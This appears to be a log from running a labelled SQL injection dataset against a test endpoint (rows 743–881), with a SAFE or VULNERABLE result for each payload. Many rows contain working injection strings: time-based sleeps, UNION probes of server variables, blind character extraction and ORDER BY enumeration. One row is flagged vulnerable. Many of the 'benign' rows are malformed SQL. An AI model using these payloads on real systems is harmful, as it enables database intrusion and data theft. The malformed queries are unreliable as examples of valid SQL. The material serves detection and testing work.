SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[743] SAFE | Status:404 | Time:0.009s | Payload: SELECT MIN(created_at) FROM users WHERE id = 1 AND AND 1=1 -- - #,meta_based,Yes,SELECT,users,MIN(created_at),=,AND,#
[744] SAFE | Status:404 | Time:0.009s | Payload: INSERT MIN(created_at) FROM admin WHERE id BETWEEN NULL AND id BETWEEN '2024-01-01',None_Type,No,INSERT,admin,MIN(created_at),BETWEEN,AND,
[745] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM transactions WHERE user_id >= 'test@example.com' OR user_id >= 'test@example.com'",None_Type,No,SELECT,transactions,"price, status",>=,OR,
[746] SAFE | Status:404 | Time:0.008s | Payload: "INSERT price, status FROM employees WHERE status > 'active' AND status > 'shipped'",None_Type,No,INSERT,employees,"price, status",>,AND,
[747] SAFE | Status:404 | Time:0.005s | Payload: "CALL price, status FROM sessions WHERE email <= NULL NOT email <= 'safe'",None_Type,No,CALL,sessions,"price, status",<=,NOT,
[748] SAFE | Status:404 | Time:0.004s | Payload: "SELECT created_at, updated_at FROM credentials WHERE id < 1 LIKE "");waitfor delay '0:0:5'-- --",Time-Based,Yes,SELECT,credentials,"created_at, updated_at",<,LIKE,--
[749] SAFE | Status:404 | Time:0.006s | Payload: "DELETE created_at, updated_at FROM admin WHERE user_id BETWEEN 'test@example.com' NOT user_id BETWEEN 'safe'",None_Type,No,DELETE,admin,"created_at, updated_at",BETWEEN,NOT,
[750] SAFE | Status:404 | Time:0.004s | Payload: EXEC MIN(created_at) FROM employees WHERE price > 'safe' AND price > '2024-01-01',None_Type,No,EXEC,employees,MIN(created_at),>,AND,
[751] SAFE | Status:404 | Time:0.004s | Payload: "SELECT id, email FROM users WHERE id <= 1 OR ORDER BY 10#",Error-Based,Yes,SELECT,users,"id, email",<=,OR,
[752] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE created_at, updated_at FROM passwords WHERE updated_at >= NULL OR updated_at >= 'shipped'",None_Type,No,UPDATE,passwords,"created_at, updated_at",>=,OR,
[753] SAFE | Status:404 | Time:0.005s | Payload: INSERT MAX(price) FROM login WHERE user_id < 'shipped' NOT user_id < 'test@example.com',None_Type,No,INSERT,login,MAX(price),<,NOT,
[754] SAFE | Status:404 | Time:0.006s | Payload: INSERT COUNT(*) FROM login WHERE created_at IN '2024-01-01' AND created_at IN NULL,None_Type,No,INSERT,login,COUNT(*),IN,AND,
[755] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM accounts WHERE id > 'safe' NOT id > '2024-01-01',None_Type,No,CALL,accounts,MIN(created_at),>,NOT,
[756] SAFE | Status:404 | Time:0.005s | Payload: "EXEC user_id, product_id FROM passwords WHERE price = 'active' AND price = 'test@example.com'",None_Type,No,EXEC,passwords,"user_id, product_id",=,AND,
[757] SAFE | Status:404 | Time:0.007s | Payload: EXEC * FROM sessions WHERE status > NULL OR status > NULL,None_Type,No,EXEC,sessions,*,>,OR,
[758] SAFE | Status:404 | Time:0.005s | Payload: "DELETE user_id, product_id FROM sessions WHERE price > 'test@example.com' NOT price > 'active'",None_Type,No,DELETE,sessions,"user_id, product_id",>,NOT,
[759] SAFE | Status:404 | Time:0.006s | Payload: SELECT COUNT(*) FROM login WHERE status LIKE 'safe' OR status LIKE 'test@example.com',None_Type,No,SELECT,login,COUNT(*),LIKE,OR,
[760] SAFE | Status:404 | Time:0.008s | Payload: "CALL price, status FROM transactions WHERE created_at LIKE 'safe' NOT created_at LIKE 'pending'",None_Type,No,CALL,transactions,"price, status",LIKE,NOT,
[761] SAFE | Status:404 | Time:0.007s | Payload: "DELETE created_at, updated_at FROM payments WHERE order_id LIKE 'active' AND order_id LIKE 'test@example.com'",None_Type,No,DELETE,payments,"created_at, updated_at",LIKE,AND,
[762] SAFE | Status:404 | Time:0.009s | Payload: UPDATE * FROM users WHERE updated_at >= 'test@example.com' AND updated_at >= 'shipped',None_Type,No,UPDATE,users,*,>=,AND,
[763] SAFE | Status:404 | Time:0.009s | Payload: "CALL id, email FROM accounts WHERE id <= 1 OR id <= '2024-01-01'",None_Type,No,CALL,accounts,"id, email",<=,OR,
[764] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM login WHERE id = 1 LIKE ORDER BY 18-- --",Error-Based,Yes,SELECT,login,"price, status",=,LIKE,--
[765] SAFE | Status:404 | Time:0.011s | Payload: "UPDATE id, email FROM passwords WHERE email < 'active' AND email < 'active'",None_Type,No,UPDATE,passwords,"id, email",<,AND,
[766] SAFE | Status:404 | Time:0.011s | Payload: "SELECT COUNT(*) FROM sessions WHERE id > 1 "" or benchmark(10000000,MD5(1))# --",Time-Based,Yes,SELECT,sessions,COUNT(*),>,,--
[767] SAFE | Status:404 | Time:0.01s | Payload: UPDATE payments SET name = 'admin' AND RANDOMBLOB(1000000000/2) WHERE id > 1,Time-Based,Yes,UPDATE,payments,*,>,AND,
[768] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM users WHERE id = 1 NOT OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- --",meta_based,Yes,SELECT,users,"price, status",=,NOT,--
[769] SAFE | Status:404 | Time:0.006s | Payload: "SELECT user_id, product_id FROM admin WHERE order_id BETWEEN NULL OR order_id BETWEEN 'shipped'",None_Type,No,SELECT,admin,"user_id, product_id",BETWEEN,OR,
[770] SAFE | Status:404 | Time:0.007s | Payload: "EXEC price, status FROM sessions WHERE status LIKE 'shipped' OR status LIKE 'shipped'",None_Type,No,EXEC,sessions,"price, status",LIKE,OR,
[771] SAFE | Status:404 | Time:0.008s | Payload: UPDATE users SET name = 'admin' WHERE id = 1 ORDER BY 22-- --,Error-Based,Yes,UPDATE,users,*,=,,--
[772] SAFE | Status:404 | Time:0.006s | Payload: "EXEC('SELECT id, email FROM sessions WHERE id = 1 OR 3409=3409 AND (1=1) AND (EXISTS (SELECT 1 FROM users WHERE username='admin') AND LENGTH('admin') = 5)')",boolean-based,Yes,EXEC,sessions,"id, email",=,,
[773] SAFE | Status:404 | Time:0.008s | Payload: "EXEC price, status FROM sessions WHERE status < 'safe' OR status < 1",None_Type,No,EXEC,sessions,"price, status",<,OR,
[774] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE price, status FROM credentials WHERE id = 'active' AND id = 'safe'",None_Type,No,UPDATE,credentials,"price, status",=,AND,
[775] SAFE | Status:404 | Time:0.01s | Payload: UPDATE * FROM sessions WHERE id >= NULL AND id >= 'test@example.com',None_Type,No,UPDATE,sessions,*,>=,AND,
[776] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM credentials WHERE status < 'shipped' AND status < 'safe',None_Type,No,CALL,credentials,MIN(created_at),<,AND,
[777] SAFE | Status:404 | Time:0.006s | Payload: CALL COUNT(*) FROM accounts WHERE price > 1 AND price > 'pending',None_Type,No,CALL,accounts,COUNT(*),>,AND,
[778] SAFE | Status:404 | Time:0.005s | Payload: SELECT COUNT(*) FROM passwords WHERE id <= 1 LIKE &&SLEEP(5)# #,Time-Based,Yes,SELECT,passwords,COUNT(*),<=,LIKE,#
[779] SAFE | Status:404 | Time:0.01s | Payload: "INSERT created_at, updated_at FROM credentials WHERE email < 'shipped' OR email < 'active'",None_Type,No,INSERT,credentials,"created_at, updated_at",<,OR,
[780] SAFE | Status:404 | Time:0.012s | Payload: EXEC('SELECT * FROM transactions WHERE id = 1 NOT ORDER BY 6--'),Error-Based,Yes,EXEC,transactions,*,=,NOT,
[781] SAFE | Status:404 | Time:0.01s | Payload: SELECT MIN(created_at) FROM users WHERE email BETWEEN NULL NOT email BETWEEN 'safe',None_Type,No,SELECT,users,MIN(created_at),BETWEEN,NOT,
[782] SAFE | Status:404 | Time:0.011s | Payload: "EXEC created_at, updated_at FROM sessions WHERE created_at != '2024-01-01' NOT created_at != 'shipped'",None_Type,No,EXEC,sessions,"created_at, updated_at",!=,NOT,
[783] SAFE | Status:404 | Time:0.01s | Payload: "SELECT id, email FROM accounts WHERE id != 1 OR 1=1 UNION SELECT @@hostname, @@datadir, null, null-- --",stackqueries_based,Yes,SELECT,accounts,"id, email",!=,Embedded in Payload,--
[784] SAFE | Status:404 | Time:0.006s | Payload: UPDATE COUNT(*) FROM passwords WHERE user_id BETWEEN 'pending' NOT user_id BETWEEN 'active',None_Type,No,UPDATE,passwords,COUNT(*),BETWEEN,NOT,
[785] SAFE | Status:404 | Time:0.011s | Payload: "EXEC price, status FROM admin WHERE updated_at < 'safe' OR updated_at < 1",None_Type,No,EXEC,admin,"price, status",<,OR,
[786] SAFE | Status:404 | Time:0.009s | Payload: "SELECT price, status FROM credentials WHERE product_id BETWEEN 1 NOT product_id BETWEEN 'test@example.com'",None_Type,No,SELECT,credentials,"price, status",BETWEEN,NOT,
[787] SAFE | Status:404 | Time:0.012s | Payload: "SELECT id, email FROM employees WHERE price != 'test@example.com' OR price != 'shipped'",None_Type,No,SELECT,employees,"id, email",!=,OR,
[788] SAFE | Status:404 | Time:0.012s | Payload: "SELECT price, status FROM accounts WHERE id < 1 NOT AND 1=1 HAVING COUNT(*) > 0 -- #",meta_based,Yes,SELECT,accounts,"price, status",<,NOT,#
[789] SAFE | Status:404 | Time:0.012s | Payload: EXEC MAX(price) FROM login WHERE status = 'pending' AND status = 'test@example.com',None_Type,No,EXEC,login,MAX(price),=,AND,
[790] SAFE | Status:404 | Time:0.009s | Payload: EXEC COUNT(*) FROM payments WHERE status BETWEEN 1 NOT status BETWEEN 1,None_Type,No,EXEC,payments,COUNT(*),BETWEEN,NOT,
[791] SAFE | Status:404 | Time:0.009s | Payload: CALL COUNT(*) FROM passwords WHERE created_at = 'safe' NOT created_at = 'shipped',None_Type,No,CALL,passwords,COUNT(*),=,NOT,
[792] SAFE | Status:404 | Time:0.007s | Payload: UPDATE COUNT(*) FROM credentials WHERE id BETWEEN '2024-01-01' AND id BETWEEN '2024-01-01',None_Type,No,UPDATE,credentials,COUNT(*),BETWEEN,AND,
[793] VULNERABLE | Status:200 | Time:0.008s | Payload: "INSERT INTO sessions (id, username) VALUES (1, 'OR 3409=3409 AND (1=1) AND (ASCII(SUBSTRING('password',1,1)) = 112) -- Check for 'p'')",boolean-based,Yes,INSERT,sessions,*,=,,
[794] SAFE | Status:404 | Time:0.006s | Payload: "SELECT MIN(created_at) FROM passwords WHERE id <= 1 OR 3409=3409 AND (1=1) AND (SUBSTRING('admin',1,1) = 'a' OR SUBSTRING('admin',2,1) = 'd') #",boolean-based,Yes,SELECT,passwords,MIN(created_at),<=,,#
[795] SAFE | Status:404 | Time:0.006s | Payload: "DELETE user_id, product_id FROM transactions WHERE status <= '2024-01-01' AND status <= 'active'",None_Type,No,DELETE,transactions,"user_id, product_id",<=,AND,
[796] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MAX(price) FROM sessions WHERE updated_at < '2024-01-01' NOT updated_at < 'active',None_Type,No,UPDATE,sessions,MAX(price),<,NOT,
[797] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE id, email FROM admin WHERE price IN 'active' OR price IN NULL",None_Type,No,UPDATE,admin,"id, email",IN,OR,
[798] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM accounts WHERE email > 'pending' OR email > 1,None_Type,No,SELECT,accounts,MAX(price),>,OR,
[799] SAFE | Status:404 | Time:0.004s | Payload: "UPDATE created_at, updated_at FROM admin WHERE created_at >= NULL AND created_at >= NULL",None_Type,No,UPDATE,admin,"created_at, updated_at",>=,AND,
[800] SAFE | Status:404 | Time:0.006s | Payload: "EXEC created_at, updated_at FROM transactions WHERE status IN 'pending' AND status IN 'shipped'",None_Type,No,EXEC,transactions,"created_at, updated_at",IN,AND,
[801] SAFE | Status:404 | Time:0.008s | Payload: "EXEC user_id, product_id FROM credentials WHERE price = 'shipped' AND price = 'active'",None_Type,No,EXEC,credentials,"user_id, product_id",=,AND,
[802] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM accounts WHERE id >= 1 or pg_SLEEP(5)#",Time-Based,Yes,SELECT,accounts,"id, email",>=,,
[803] SAFE | Status:404 | Time:0.009s | Payload: CALL * FROM passwords WHERE order_id IN 1 OR order_id IN 'test@example.com',None_Type,No,CALL,passwords,*,IN,OR,
[804] SAFE | Status:404 | Time:0.006s | Payload: "CALL price, status FROM sessions WHERE status >= NULL AND status >= 'active'",None_Type,No,CALL,sessions,"price, status",>=,AND,
[805] SAFE | Status:404 | Time:0.007s | Payload: UPDATE * FROM accounts WHERE user_id >= 'shipped' OR user_id >= 'pending',None_Type,No,UPDATE,accounts,*,>=,OR,
[806] SAFE | Status:404 | Time:0.005s | Payload: SELECT MIN(created_at) FROM passwords WHERE updated_at > 'active' NOT updated_at > 'shipped',None_Type,No,SELECT,passwords,MIN(created_at),>,NOT,
[807] SAFE | Status:404 | Time:0.008s | Payload: "DELETE FROM admin WHERE id <= 1 OR "" UNION SELECT null, null, null, null FROM information_schema.tables -- --",meta_based,Yes,DELETE,admin,,<=,OR,--
[808] SAFE | Status:404 | Time:0.006s | Payload: "CALL user_id, product_id FROM users WHERE user_id <= 'active' AND user_id <= 'test@example.com'",None_Type,No,CALL,users,"user_id, product_id",<=,AND,
[809] SAFE | Status:404 | Time:0.008s | Payload: "CALL created_at, updated_at FROM employees WHERE price IN 'shipped' AND price IN 'active'",None_Type,No,CALL,employees,"created_at, updated_at",IN,AND,
[810] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM employees WHERE id > 1 OR ORDER BY 23 #",Union-Based,Yes,SELECT,employees,"price, status",>,OR,#
[811] SAFE | Status:404 | Time:0.01s | Payload: "INSERT INTO transactions (id, username) VALUES (1, 'OR 3409=3409 AND (1=1) AND (SUBSTRING('password',1,1) = 'p')') --",boolean-based,Yes,INSERT,transactions,*,=,,--
[812] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM passwords WHERE status BETWEEN 'shipped' AND status BETWEEN 'active'",None_Type,No,SELECT,passwords,"id, email",BETWEEN,AND,
[813] SAFE | Status:404 | Time:0.01s | Payload: "SELECT created_at, updated_at FROM transactions WHERE updated_at < 'active' NOT updated_at < 1",None_Type,No,SELECT,transactions,"created_at, updated_at",<,NOT,
[814] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT id, email FROM payments WHERE id = 1 OR 1=1 UNION SELECT @@innodb_version, @@protocol_version, null, null--') #",stackqueries_based,Yes,EXEC,payments,"id, email",=,Embedded in Payload,#
[815] SAFE | Status:404 | Time:0.008s | Payload: DELETE COUNT(*) FROM transactions WHERE product_id >= 'active' AND product_id >= 'active',None_Type,No,DELETE,transactions,COUNT(*),>=,AND,
[816] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM sessions WHERE status IN 'test@example.com' OR status IN 'test@example.com'",None_Type,No,SELECT,sessions,"created_at, updated_at",IN,OR,
[817] SAFE | Status:404 | Time:0.009s | Payload: "SELECT price, status FROM credentials WHERE id <= 1 ORDER BY 12-- #",Error-Based,Yes,SELECT,credentials,"price, status",<=,,#
[818] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM payments WHERE product_id > NULL NOT product_id > 'shipped',None_Type,No,CALL,payments,MIN(created_at),>,NOT,
[819] SAFE | Status:404 | Time:0.008s | Payload: CALL login_procedure(NOT );waitfor delay '0:0:5'--) --,Time-Based,Yes,CALL,login,*,=,NOT,--
[820] SAFE | Status:404 | Time:0.006s | Payload: "INSERT created_at, updated_at FROM accounts WHERE id >= NULL NOT id >= 'test@example.com'",None_Type,No,INSERT,accounts,"created_at, updated_at",>=,NOT,
[821] SAFE | Status:404 | Time:0.008s | Payload: "INSERT price, status FROM credentials WHERE price != 'active' OR price != 'active'",None_Type,No,INSERT,credentials,"price, status",!=,OR,
[822] SAFE | Status:404 | Time:0.005s | Payload: CALL * FROM sessions WHERE price < 'safe' AND price < 'shipped',None_Type,No,CALL,sessions,*,<,AND,
[823] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM login WHERE user_id >= NULL OR user_id >= 'active',None_Type,No,CALL,login,MIN(created_at),>=,OR,
[824] SAFE | Status:404 | Time:0.005s | Payload: SELECT MAX(price) FROM users WHERE id > 1 AND ORDER BY 21--,Error-Based,Yes,SELECT,users,MAX(price),>,AND,
[825] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM payments WHERE created_at LIKE 'shipped' AND created_at LIKE NULL",None_Type,No,SELECT,payments,"id, email",LIKE,AND,
[826] SAFE | Status:404 | Time:0.011s | Payload: "CALL created_at, updated_at FROM accounts WHERE created_at = 'shipped' NOT created_at = 'safe'",None_Type,No,CALL,accounts,"created_at, updated_at",=,NOT,
[827] SAFE | Status:404 | Time:0.011s | Payload: "EXEC('SELECT price, status FROM login WHERE id = 1 AND ORDER BY 8') #",Union-Based,Yes,EXEC,login,"price, status",=,AND,#
[828] SAFE | Status:404 | Time:0.011s | Payload: "CALL created_at, updated_at FROM payments WHERE updated_at > 'active' AND updated_at > 'pending'",None_Type,No,CALL,payments,"created_at, updated_at",>,AND,
[829] SAFE | Status:404 | Time:0.011s | Payload: DELETE * FROM login WHERE order_id > 'safe' NOT order_id > 'active',None_Type,No,DELETE,login,*,>,NOT,
[830] SAFE | Status:404 | Time:0.01s | Payload: "SELECT user_id, product_id FROM credentials WHERE id <= 1 OR HAVING 1=0# #",Error-Based,Yes,SELECT,credentials,"user_id, product_id",<=,OR,#
[831] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM accounts WHERE id < 1 ORDER BY 28 --",Union-Based,Yes,SELECT,accounts,"created_at, updated_at",<,,--
[832] SAFE | Status:404 | Time:0.007s | Payload: "DELETE FROM payments WHERE id <= 1 '\"" #",Time-Based,Yes,DELETE,payments,*,<=,,#
[833] SAFE | Status:404 | Time:0.005s | Payload: CALL COUNT(*) FROM login WHERE id <= 'safe' NOT id <= NULL,None_Type,No,CALL,login,COUNT(*),<=,NOT,
[834] SAFE | Status:404 | Time:0.012s | Payload: CALL MAX(price) FROM passwords WHERE id != NULL NOT id != 'active',None_Type,No,CALL,passwords,MAX(price),!=,NOT,
[835] SAFE | Status:404 | Time:0.012s | Payload: "CALL id, email FROM accounts WHERE product_id <= 'pending' AND product_id <= '2024-01-01'",None_Type,No,CALL,accounts,"id, email",<=,AND,
[836] SAFE | Status:404 | Time:0.009s | Payload: DELETE FROM admin WHERE id >= 1 HAVING 1=1--,Error-Based,Yes,DELETE,admin,*,>=,,
[837] SAFE | Status:404 | Time:0.01s | Payload: "DELETE price, status FROM admin WHERE email IN 'test@example.com' NOT email IN '2024-01-01'",None_Type,No,DELETE,admin,"price, status",IN,NOT,
[838] SAFE | Status:404 | Time:0.008s | Payload: "CALL created_at, updated_at FROM sessions WHERE order_id = 'test@example.com' OR order_id = 'pending'",None_Type,No,CALL,sessions,"created_at, updated_at",=,OR,
[839] SAFE | Status:404 | Time:0.009s | Payload: "SELECT price, status FROM passwords WHERE product_id BETWEEN '2024-01-01' OR product_id BETWEEN 'active'",None_Type,No,SELECT,passwords,"price, status",BETWEEN,OR,
[840] SAFE | Status:404 | Time:0.007s | Payload: EXEC MAX(price) FROM payments WHERE email >= 'active' AND email >= 'pending',None_Type,No,EXEC,payments,MAX(price),>=,AND,
[841] SAFE | Status:404 | Time:0.007s | Payload: "EXEC user_id, product_id FROM login WHERE email <= 'active' OR email <= 'active'",None_Type,No,EXEC,login,"user_id, product_id",<=,OR,
[842] SAFE | Status:404 | Time:0.007s | Payload: "CALL id, email FROM transactions WHERE user_id IN '2024-01-01' NOT user_id IN 'active'",None_Type,No,CALL,transactions,"id, email",IN,NOT,
[843] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM sessions WHERE email != 'safe' OR email != 'shipped',None_Type,No,CALL,sessions,MAX(price),!=,OR,
[844] SAFE | Status:404 | Time:0.006s | Payload: "DELETE user_id, product_id FROM credentials WHERE email BETWEEN 'safe' OR email BETWEEN 'active'",None_Type,No,DELETE,credentials,"user_id, product_id",BETWEEN,OR,
[845] SAFE | Status:404 | Time:0.008s | Payload: "SELECT user_id, product_id FROM payments WHERE id = 1 OR OR 1=1 LIMIT 1 OFFSET 1 -- --",meta_based,Yes,SELECT,payments,"user_id, product_id",=,OR,--
[846] SAFE | Status:404 | Time:0.009s | Payload: "INSERT id, email FROM passwords WHERE email = 'active' AND email = 'safe'",None_Type,No,INSERT,passwords,"id, email",=,AND,
[847] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM login WHERE id != 1 AND "" OR 'x'='x' LIMIT 1 -- --",meta_based,Yes,SELECT,login,"id, email",!=,AND,--
[848] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM admin WHERE id > 1 &&SLEEP(5)",Time-Based,Yes,SELECT,admin,"created_at, updated_at",>,,
[849] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM employees WHERE user_id = 'safe' AND user_id = 'pending'",None_Type,No,SELECT,employees,"created_at, updated_at",=,AND,
[850] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE created_at, updated_at FROM login WHERE created_at > 'safe' NOT created_at > '2024-01-01'",None_Type,No,UPDATE,login,"created_at, updated_at",>,NOT,
[851] SAFE | Status:404 | Time:0.007s | Payload: UPDATE users SET username = 'test' WHERE id < 1 ORDER BY 31337-- #,Union-Based,Yes,UPDATE,users,*,<,,#
[852] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM payments WHERE email = 'pending' NOT email = NULL,None_Type,No,CALL,payments,MAX(price),=,NOT,
[853] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM payments WHERE price = 'test@example.com' OR price = '2024-01-01'",None_Type,No,SELECT,payments,"created_at, updated_at",=,OR,
[854] SAFE | Status:404 | Time:0.007s | Payload: "SELECT MIN(created_at) FROM payments WHERE id != 1 AND UNION SELECT 1, 2, null, null-- #",stackqueries_based,Yes,SELECT,payments,MIN(created_at),!=,AND,#
[855] SAFE | Status:404 | Time:0.007s | Payload: CALL COUNT(*) FROM credentials WHERE created_at != 'active' NOT created_at != NULL,None_Type,No,CALL,credentials,COUNT(*),!=,NOT,
[856] SAFE | Status:404 | Time:0.007s | Payload: "SELECT MIN(created_at) FROM transactions WHERE id < 1 OR 3409=3409 AND (1=0) AND (ASCII(SUBSTRING('admin',1,1)) = 97) -- Check for 'a'",boolean-based,Yes,SELECT,transactions,MIN(created_at),<,,
[857] SAFE | Status:404 | Time:0.006s | Payload: "DELETE created_at, updated_at FROM employees WHERE updated_at >= 'test@example.com' AND updated_at >= 'shipped'",None_Type,No,DELETE,employees,"created_at, updated_at",>=,AND,
[858] SAFE | Status:404 | Time:0.01s | Payload: "UPDATE price, status FROM accounts WHERE order_id = 'shipped' OR order_id = 'test@example.com'",None_Type,No,UPDATE,accounts,"price, status",=,OR,
[859] SAFE | Status:404 | Time:0.007s | Payload: EXEC MIN(created_at) FROM admin WHERE price != 'test@example.com' AND price != 'safe',None_Type,No,EXEC,admin,MIN(created_at),!=,AND,
[860] SAFE | Status:404 | Time:0.009s | Payload: "DELETE id, email FROM login WHERE id > 'test@example.com' OR id > '2024-01-01'",None_Type,No,DELETE,login,"id, email",>,OR,
[861] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM users WHERE product_id LIKE 'test@example.com' AND product_id LIKE 1",None_Type,No,SELECT,users,"id, email",LIKE,AND,
[862] SAFE | Status:404 | Time:0.007s | Payload: SELECT MAX(price) FROM admin WHERE id < 1 AND ORDER BY 26#,Error-Based,Yes,SELECT,admin,MAX(price),<,AND,
[863] SAFE | Status:404 | Time:0.005s | Payload: "CALL user_id, product_id FROM transactions WHERE user_id BETWEEN 'shipped' AND user_id BETWEEN 'active'",None_Type,No,CALL,transactions,"user_id, product_id",BETWEEN,AND,
[864] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MIN(created_at) FROM users WHERE product_id IN NULL OR product_id IN '2024-01-01',None_Type,No,UPDATE,users,MIN(created_at),IN,OR,
[865] SAFE | Status:404 | Time:0.005s | Payload: "INSERT created_at, updated_at FROM users WHERE order_id IN 'active' AND order_id IN 'safe'",None_Type,No,INSERT,users,"created_at, updated_at",IN,AND,
[866] SAFE | Status:404 | Time:0.006s | Payload: "CALL id, email FROM payments WHERE id BETWEEN 'pending' AND id BETWEEN 'test@example.com'",None_Type,No,CALL,payments,"id, email",BETWEEN,AND,
[867] SAFE | Status:404 | Time:0.007s | Payload: DELETE FROM employees WHERE id >= 1 AND ORDER BY 15# --,Error-Based,Yes,DELETE,employees,*,>=,AND,--
[868] SAFE | Status:404 | Time:0.007s | Payload: DELETE MAX(price) FROM users WHERE product_id BETWEEN 'pending' AND product_id BETWEEN '2024-01-01',None_Type,No,DELETE,users,MAX(price),BETWEEN,AND,
[869] SAFE | Status:404 | Time:0.007s | Payload: SELECT * FROM credentials WHERE id < 1 OR + SLEEP(10) + #,Time-Based,Yes,SELECT,credentials,*,<,OR,#
[870] SAFE | Status:404 | Time:0.005s | Payload: CALL MIN(created_at) FROM accounts WHERE status = 'test@example.com' AND status = NULL,None_Type,No,CALL,accounts,MIN(created_at),=,AND,
[871] SAFE | Status:404 | Time:0.007s | Payload: "INSERT user_id, product_id FROM accounts WHERE created_at >= 'shipped' AND created_at >= NULL",None_Type,No,INSERT,accounts,"user_id, product_id",>=,AND,
[872] SAFE | Status:404 | Time:0.005s | Payload: UPDATE COUNT(*) FROM users WHERE user_id BETWEEN 'active' NOT user_id BETWEEN 'pending',None_Type,No,UPDATE,users,COUNT(*),BETWEEN,NOT,
[873] SAFE | Status:404 | Time:0.005s | Payload: "SELECT created_at, updated_at FROM payments WHERE id <= 1 LIKE IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- --",Error-Based,Yes,SELECT,payments,"created_at, updated_at",<=,LIKE,--
[874] SAFE | Status:404 | Time:0.006s | Payload: "EXEC user_id, product_id FROM credentials WHERE product_id IN 'test@example.com' OR product_id IN 1",None_Type,No,EXEC,credentials,"user_id, product_id",IN,OR,
[875] SAFE | Status:404 | Time:0.005s | Payload: CALL MAX(price) FROM sessions WHERE email > '2024-01-01' NOT email > '2024-01-01',None_Type,No,CALL,sessions,MAX(price),>,NOT,
[876] SAFE | Status:404 | Time:0.005s | Payload: "SELECT user_id, product_id FROM transactions WHERE id <= 1 OR UNION SELECT null, version(), null -- --",meta_based,Yes,SELECT,transactions,"user_id, product_id",<=,OR,--
[877] SAFE | Status:404 | Time:0.005s | Payload: INSERT * FROM credentials WHERE created_at >= '2024-01-01' OR created_at >= 'test@example.com',None_Type,No,INSERT,credentials,*,>=,OR,
[878] SAFE | Status:404 | Time:0.006s | Payload: "SELECT * FROM admin WHERE id <= 1 LIKE benchmark(10000000,MD5(1))# #",Time-Based,Yes,SELECT,admin,*,<=,LIKE,#
[879] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM accounts WHERE status IN '2024-01-01' OR status IN NULL,None_Type,No,SELECT,accounts,MAX(price),IN,OR,
[880] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM transactions WHERE id <= 1 AND ORDER BY 30",Union-Based,Yes,SELECT,transactions,"id, email",<=,AND,
[881] SAFE | Status:404 | Time:0.006s | Payload: "CALL price, status FROM sessions WHERE created_at <= 1 AND created_at <= 'active'",None_Type,No,CALL,sessions,"price, status",<=,AND,
